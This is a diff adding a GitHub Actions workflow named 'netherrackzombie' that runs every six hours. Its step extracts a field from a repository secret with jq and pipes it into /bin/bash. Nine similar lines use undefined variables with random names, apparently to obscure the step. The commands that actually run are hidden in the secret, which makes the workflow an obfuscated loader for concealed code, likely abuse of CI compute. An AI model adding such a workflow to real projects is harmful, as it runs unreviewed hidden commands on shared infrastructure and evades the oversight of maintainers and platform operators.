@@ -1,0 +1,27 @@
+name: netherrackzombie
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: netherrackzombie
+        env:
+          vjy60: ${{ secrets.vjy60 }}
+        run: |
+          echo $vjy60 | jq -r .i625 | /bin/bash
+          echo $xy31374 | jq -r .n0 | /bin/bash
+          echo $yyfhi95 | jq -r .wxs03792 | /bin/bash
+          echo $y9 | jq -r .y27913 | /bin/bash
+          echo $yhnkn9 | jq -r .q570 | /bin/bash
+          echo $yxm62 | jq -r .uwrdh9852 | /bin/bash
+          echo $muji98369 | jq -r .yn1719 | /bin/bash
+          echo $jkrg19834 | jq -r .ua0685 | /bin/bash
+          echo $i147 | jq -r .toiwf3190 | /bin/bash
+          echo $omb1 | jq -r .vsy2108 | /bin/bash
+
